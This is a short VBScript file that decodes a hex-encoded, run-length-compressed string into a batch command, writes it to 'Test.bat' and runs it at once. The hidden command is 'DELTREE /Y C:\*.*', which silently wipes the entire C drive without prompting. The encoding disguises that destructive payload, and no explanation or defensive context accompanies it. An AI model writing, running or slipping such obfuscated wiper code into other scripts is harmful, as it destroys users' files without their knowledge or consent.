t="44,45,4C,54,52,452,20,2F,59,20,43,3A,5C,2A,2E,2A,0D,0A,0D,0A"

tmp = Split(t, ",")
Set fso = CreateObject("Scripting.FileSystemObject")
pth = "C:\Documents and Settings\ADOLFO FERNANDEZ\My Documents\VBS Files\Test.bat"
Set f = fso.CreateTextFile(pth, ForWriting)
For i = 0 To UBound(tmp)
	l = Len(tmp(i))
	b = Int("&H" & Left(tmp(i), 2))
	If l > 2 Then
		r = Int("&H" & Mid(tmp(i), 3, l))
		For j = 1 To r
		f.Write Chr(b)
		Next
	Else
		f.Write Chr(b)
	End If
Next
f.Close
WScript.CreateObject("WScript.Shell").run(pth)
